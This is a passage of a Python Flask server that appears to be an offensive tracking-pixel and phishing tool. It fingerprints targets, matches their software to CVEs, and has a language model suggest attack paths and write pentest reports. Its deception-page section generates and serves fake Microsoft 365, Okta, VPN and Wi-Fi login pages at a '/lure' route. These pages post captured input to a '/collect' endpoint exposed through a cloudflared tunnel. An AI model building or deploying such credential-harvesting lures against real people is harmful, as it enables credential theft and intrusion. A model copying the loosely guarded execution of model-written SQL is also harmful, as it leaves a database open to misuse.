        "SELECT pixel_id, cve_id, cvss_score, cvss_severity FROM cve_results ORDER BY cvss_score DESC LIMIT 100"
    ).fetchall()]
    conn.close()
    return jsonify(llm_analyst.session_summary(
        [dict(t) for t in targets], all_cves
    ))


# ── Network Topology ──────────────────────────────────────────────────────────

@app.route("/api/network-topology")
def api_network_topology():
    import llm_analyst
    targets = db.get_all_targets()
    return jsonify(llm_analyst.build_network_topology([dict(t) for t in targets]))


# ── Alert Rules ───────────────────────────────────────────────────────────────

_alert_rules = []   # in-memory store: [{name, description, sql_check, severity, enabled}]

@app.route("/api/alerts/rules", methods=["GET"])
def api_alert_rules_get():
    return jsonify(_alert_rules)

@app.route("/api/alerts/rules", methods=["POST"])
def api_alert_rules_create():
    import llm_analyst
    body = request.get_json(force=True) or {}
    nl   = body.get("description", "").strip()
    if not nl:
        return jsonify({"error": "description required"}), 400
    rule = llm_analyst.nl_to_alert_rule(nl)
    if "error" in rule:
        return jsonify(rule), 500
    rule["enabled"] = True
    rule["id"]      = len(_alert_rules) + 1
    _alert_rules.append(rule)
    return jsonify(rule)

@app.route("/api/alerts/rules/<int:rule_id>", methods=["DELETE"])
def api_alert_rule_delete(rule_id):
    global _alert_rules
    _alert_rules = [r for r in _alert_rules if r.get("id") != rule_id]
    return jsonify({"ok": True})

@app.route("/api/alerts/check")
def api_alerts_check():
    """Run all enabled alert rules and return matches."""
    import sqlite3 as _sq
    results = []
    conn = _sq.connect("data/targets.db")
    conn.row_factory = _sq.Row
    for rule in _alert_rules:
        if not rule.get("enabled"):
            continue
        sql = rule.get("sql_check", "")
        first_word = sql.strip().split()[0].upper() if sql.strip() else ""
        if first_word not in ("SELECT", "WITH"):
            continue
        try:
            rows = conn.execute(sql).fetchall()
            if rows:
                results.append({
                    "rule":    rule["suggested_name"],
                    "severity": rule["severity"],
                    "matches": [dict(r) for r in rows[:10]],
                })
        except Exception:
            pass
    conn.close()
    return jsonify({"alerts": results, "count": len(results)})


# ── Pentest Report ────────────────────────────────────────────────────────────

@app.route("/report/<pixel_id>")
def report_page(pixel_id):
    """Render report shell instantly — JS fetches data sections in parallel."""
    data = db.get_target(pixel_id)
    if not data:
        abort(404)
    fp   = data["fingerprint"] or {}
    cves = data["cves"] or []
    hits = data["hits"] or []
    return render_template("report.html",
                           pixel_id=pixel_id,
                           fp=fp, cves=cves, hits=hits,
                           generated_at=time.strftime("%Y-%m-%d %H:%M UTC", time.gmtime()))


@app.route("/api/report-data/<pixel_id>")
def api_report_data(pixel_id):
    """
    Run profile + attack-paths + report narrative in parallel threads.
    Returns all three as a single JSON object.
    """
    import llm_analyst
    from concurrent.futures import ThreadPoolExecutor

    data = db.get_target(pixel_id)
    if not data:
        return jsonify({"error": "Target not found"}), 404

    fp   = data["fingerprint"] or {}
    cves = data["cves"] or []
    hits = data["hits"] or []

    # Step 1 — profile and attack paths run in parallel
    with ThreadPoolExecutor(max_workers=2) as ex:
        f_profile = ex.submit(llm_analyst.profile_target, fp, cves, hits)
        f_paths   = ex.submit(llm_analyst.suggest_attack_paths, fp, cves)
        profile   = f_profile.result()
        paths     = f_paths.result()

    # Step 2 — report narrative uses profile + paths (depends on step 1)
    report = llm_analyst.generate_report_data(fp, cves, profile, paths)

    return jsonify({
        "profile": profile,
        "paths":   paths,
        "report":  report,
        "generated_at": time.strftime("%Y-%m-%d %H:%M UTC", time.gmtime()),
    })


# ── Deception Page Generator ──────────────────────────────────────────────────

DECEPTION_THEMES = [
    "auto (detect from target profile)",
    "Microsoft 365 / Outlook Login",
    "Okta SSO Portal",
    "VPN / Remote Access Portal",
    "IT Help Desk Ticket",
    "SharePoint / OneDrive",
    "HR Self-Service Portal",
    "Software License Renewal",
    "Corporate Wi-Fi Login",
]

@app.route("/api/deception/themes")
def api_deception_themes():
    return jsonify({"themes": DECEPTION_THEMES})

@app.route("/api/deception/generate/<pixel_id>", methods=["POST"])
def api_deception_generate(pixel_id):
    import llm_analyst
    data = db.get_target(pixel_id)
    fp   = data["fingerprint"] if data else {}
    body = request.get_json(force=True) or {}
    theme = body.get("theme", "auto")
    with_tunnel = _get_public_url()
    base = with_tunnel or request.host_url.rstrip("/")
    collect_url = f"{base}/collect"
    html = llm_analyst.generate_deception_page(fp, pixel_id, collect_url, theme)
    return jsonify({"html": html})

@app.route("/lure/<pixel_id>")
def lure_page(pixel_id):
    """Serve a generated deception page live."""
    import llm_analyst
    theme = request.args.get("theme", "auto")
    data  = db.get_target(pixel_id)
    fp    = data["fingerprint"] if data else {}
    with_tunnel = _get_public_url()
    base  = with_tunnel or request.host_url.rstrip("/")
    collect_url = f"{base}/collect"
    html  = llm_analyst.generate_deception_page(fp, pixel_id, collect_url, theme)
    return Response(html, mimetype="text/html")


# ── API endpoints ─────────────────────────────────────────────────────────────

@app.route("/api/targets")
def api_targets():
    return jsonify(db.get_all_targets())


@app.route("/api/target/<pixel_id>")
def api_target(pixel_id):
    return jsonify(db.get_target(pixel_id))


@app.route("/api/refresh_cves/<pixel_id>", methods=["POST"])
def api_refresh_cves(pixel_id):
    """Manually trigger a CVE re-lookup for a target."""
    data = db.get_target(pixel_id)
    fp   = data.get("fingerprint", {})
    if not fp:
        return jsonify({"error": "no fingerprint yet"}), 404
    parsed = {
        "os_family":       fp.get("os_family", ""),
        "os_version":      fp.get("os_version", ""),
        "os_raw":          fp.get("os_raw", ""),
        "browser_family":  fp.get("browser_family", ""),
        "browser_version": fp.get("browser_version", ""),
    }
    threading.Thread(
        target=_do_cve_lookup, args=(pixel_id, parsed), daemon=True
    ).start()
    return jsonify({"status": "cve lookup triggered"})


_cleaned_up = False

def _cleanup():
    """Release resources: kill tunnel, free port. Safe to call from anywhere."""
    global _cleaned_up
    if _cleaned_up:
        return
    _cleaned_up = True
    # Kill cloudflared tunnel
    try:
        subprocess.call(["pkill", "-TERM", "cloudflared"],
                        stderr=subprocess.DEVNULL)
        print("[shutdown] cloudflared stopped")
    except Exception:
        pass

    # Force-release port 5000 (any leftover process that isn't us)
    try:
        result = subprocess.check_output(
            ["lsof", "-ti", ":5000"], stderr=subprocess.DEVNULL
        ).decode().strip()
        for pid in result.splitlines():
            try:
                if pid and int(pid) != os.getpid():
                    os.kill(int(pid), signal.SIGKILL)
                    print(f"[shutdown] released port 5000 (killed pid {pid})")
            except Exception:
                pass
    except Exception:
        pass

    # Clean up temp tunnel log
    try:
        os.remove("/tmp/cf.log")
    except Exception:
        pass

    print("[shutdown] Done. Goodbye.")


def _signal_handler(signum, frame):
    """Handle Ctrl+C (SIGINT) and kill (SIGTERM) — cleanup then exit."""
    print("\n[shutdown] Signal received — cleaning up…")
    _cleanup()
    sys.exit(0)


# Register signal handlers
signal.signal(signal.SIGINT,  _signal_handler)   # Ctrl+C
signal.signal(signal.SIGTERM, _signal_handler)   # kill / systemd stop


if __name__ == "__main__":
    import atexit
    atexit.register(_cleanup)   # atexit version never calls sys.exit
    try:
        app.run(debug=False, host="0.0.0.0", port=5000, use_reloader=False)
    except SystemExit:
        pass
